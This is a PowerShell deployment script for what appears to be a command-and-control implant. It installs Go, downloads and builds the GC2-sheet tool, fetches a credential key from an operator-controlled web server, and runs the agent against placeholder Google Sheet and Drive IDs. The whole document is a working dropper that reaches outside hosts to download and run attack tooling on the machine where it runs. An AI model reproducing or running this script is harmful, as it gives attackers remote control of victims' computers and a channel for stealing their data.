<#
A Powershell script that downloads go, adds it the user's path, downloads the zip from the repository "looCiprian/GC2-sheet",
builds the executable, and runs gc2-sheet. Note: requires a web server to host the #MY_KEY_JSON file to Invoke-Webrequest down,
#MY_SHEET_ID, and #MY_DRIVE_ID to be incorporated into the PS1. Recommend using Invoke-WebRequest to pull down
the contents of the file.
#>
# For baked in variables
$myUrl=#MY_TARGET_URL
$myKey=#MY_KEY_JSON
$mySheetId=#MY_SHEET_ID
$myDriveId=#MY_DRIVE_ID
cd $env:userprofile\Downloads;
iwr https://go.dev/dl/go1.21.12.windows-amd64.zip -o go.zip;
expand-archive go.zip;
mv .\go $env:userprofile;rm -r -force .\go.zip;
$env:PATH += ";$env:userprofile\go\go\bin";
iwr https://github.com/looCiprian/GC2-sheet/archive/refs/heads/master.zip -o master.zip;
expand-archive .\master.zip;
rm -r -force master.zip;
cd .\master\GC2-sheet-master;
iwr http://$myUrl/$myKey -usebasicparsing -o $myKey;
go build gc2-sheet.go;
.\gc2-sheet -k $myKey -s $mySheetId -d $myDriveId
